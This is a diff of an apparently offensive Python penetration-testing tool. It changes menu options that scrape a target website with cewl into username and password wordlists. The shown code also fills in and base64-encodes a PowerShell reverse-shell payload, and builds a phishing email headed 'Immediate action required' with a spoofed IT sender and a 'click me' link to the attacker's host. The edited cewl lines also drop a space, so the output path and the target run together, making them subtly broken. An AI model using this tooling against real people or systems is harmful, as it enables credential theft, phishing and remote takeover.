@@ -432,31 +432,6 @@ def powershell(ip, port):
    rev = revPlain.replace("SUPERIPA" , ip).replace("PORT", port)
    payload = base64.b64encode(rev.encode('UTF-16LE')).decode()
    return payload
-   
-def fileCheck(variable):
-   count = lineCount(variable)
-   if count == 0:
-      if USR[:1] != "'":
-         print("[+] Adding user " + USR.rstrip(" ") + " to " + variable + "...")
-         localCOM("echo " + USR.rstrip(" ") + " > " + variable)
-         if PAS[:1] != "'":
-            print("[+] Adding password " + USR.rstrip(" ") + " to " + variable + "...")
-            localCOM("echo " + PAS.rstrip(" ") + " > " + variable)
-      else:
-         if os.path.exists("/usr/share/ncrack/minimal.usr"):
-            print("[+] Adding mimimal userlist to " + variable + "...")
-            localCOM("cat /usr/share/ncrack/minimal.usr >> " + variable + " 2>&1")
-            localCOM("sed -i '/#/d' " + variable + " 2>&1")
-            localCOM("sed -i '/Email addresses found/d' " + variable + " 2>&1")
-            localCOM("sed -i '/---------------------/d' " + variable + " 2>&1")
-         else:
-            print("[+] Adding username Administrator to " + variable + "...")
-            localCOM("echo 'Administrator' > " + variable)
-            print("[+] Adding password Admin to " + variable + "...")
-            localCOM("echo 'Admin' > " + variable)
-   else:
-      print("[+] Checked file " + variable + ", the file contains data...")
-   return
       
 def dispBanner(variable,flash):
    ascii_banner = pyfiglet.figlet_format(variable).upper()
@@ -984,7 +959,6 @@ while True:
    localCOM("rm *.tmp")							# CLEAR GARBAGE
    linecache.clearcache()						# CLEARS CACHES
    checkParams = 0							# RESET'S VALUE
-   checkFile = ""							# RESET'S VALUE
    LTM = getTime()							# GET CLOCKTIME
    localCOM("clear")							# CLEARS SCREEN
    dispMenu()								# DISPLAY UPPER
@@ -3138,13 +3112,7 @@ while True:
          checkParams = test_PRT("25")         
       if checkParams != 1:
          checkParams = getPort()                 
-         if checkParams != 1:                     
-            print(colored("[*] Checking for valid usernames...", colour3))
-            fileCheck(dataDir + "/usernames.txt")
-            for x in range (0, maxUser):
-               USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
-               USER[x] = spacePadding(USER[x], COL3)         
-            wipeTokens(VALD)
+         if checkParams != 1:
             print(colored("[*] Attempting to connect to remote SMTP socket...", colour3))
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             try:
@@ -3211,12 +3179,13 @@ while True:
                localCOM('echo "\t  Citrix http://"' + localIP + ":" + checkParams + '"/" >> body.tmp')
                localCOM('echo "  <a href=\"http://"' + localIP + ":" + checkParams + '"\">click me.</a>" >> body.tmp')
                localCOM('echo "\nRegards," >> body.tmp')
-               sender = input("[?] Please enter senders name: ")
-               if sender == "":
-                  sender = "it"
-               localCOM('echo ' + sender + '@' + DOM.rstrip(" ") + ' >> body.tmp')
+
                print(colored("\nSubject: Immediate action required", colour6))  
                catsFile("body.tmp")                      
+               sender = input("[?] Please enter senders name only, defualt is it: ")
+               if sender == "":
+                  sender = "it"
+               localCOM('echo ' + sender + '@' + DOM.rstrip(" ") + ' >> body.tmp')               
                print(colored("[*] Starting phishing server...", colour3))            
                dispBanner("GONE PHISHING",0)               
                localCOM("xdotool key Ctrl+Shift+T")
@@ -3348,20 +3317,28 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='81':
-      checkParams = test_TIP()            
+      checkParams = test_PRT("80")
       if checkParams != 1:
-         if WEB[:5] != "EMPTY":
-            remotCOM("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/usernames.txt " + WEB.rstrip(" ") + " 2>&1")
-            print("[+] User list generated via website...")
-         else:
-            remotCOM("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " 2>&1")
-            print("[+] User list generated via ip address...")         
-         fileCheck(dataDir + "/usernames.txt")
-         for x in range (0, maxUser):
-            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
-            USER[x] = spacePadding(USER[x], COL3)         
-         wipeTokens(VALD)         
-      prompt() 
+         checkParams = test_WEB()
+         if checkParams != 1:
+            if WEB[:5] != "EMPTY":
+               remotCOM("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/usernames.txt" + WEB.rstrip(" ") + " 2>&1")
+               print("[+] Username list generated via website...")
+            else:
+               checkParams = test_TIP()
+               if checkParams != 1:
+                  remotCOM("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/usernames.txt" + TIP.rstrip(" ") + " 2>&1")
+                  print("[+] Username list generated via ip address...")
+      else:
+         localCOM("cat /usr/share/ncrack/minimal.usr >> " + dataDir + "/usernames.txt 2>&1")
+         cutLine("# minimal list of very", dataDir + "/usernames.txt")
+         print("[+] Username list generated via /usr/share/ncrack/minimal.usr...")
+
+      for x in range (0, maxUser):
+         USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
+         USER[x] = spacePadding(USER[x], COL3)         
+      wipeTokens(VALD)         
+      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -3372,15 +3349,22 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='82':
-      checkParams = test_TIP()      
+      checkParams = test_PRT("80")
       if checkParams != 1:
-         if WEB[:5] != "EMPTY":
-            remotCOM("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/passwords.txt " + WEB.rstrip(" ") + " 2>&1")
-            print("[+] Password list generated via website...")
-         else:
-            remotCOM("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/passwords.txt " + TIP.rstrip(" ") + " 2>&1")
-            print("[+] Password list generated via ip address...")            
-         fileCheck(dataDir + "/passwords.txt")   
+         checkParams = test_WEB()
+         if checkParams != 1:
+            if WEB[:5] != "EMPTY":
+               remotCOM("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/passwords.txt" + WEB.rstrip(" ") + " 2>&1")
+               print("[+] Password list generated via website...")
+            else:
+               checkParams = test_TIP()
+               if checkParams != 1:
+                  remotCOM("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/passwords.txt" + TIP.rstrip(" ") + " 2>&1")
+                  print("[+] Password list generated via ip address...")
+      else:
+         localCOM("cat /usr/share/ncrack/minimal.usr >> " + dataDir + "/passwords.txt 2>&1")
+         cutLine("# minimal list of very", dataDir + "/passwords.txt")
+         print("[+] Password list generated via /usr/share/ncrack/minimal.usr...")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
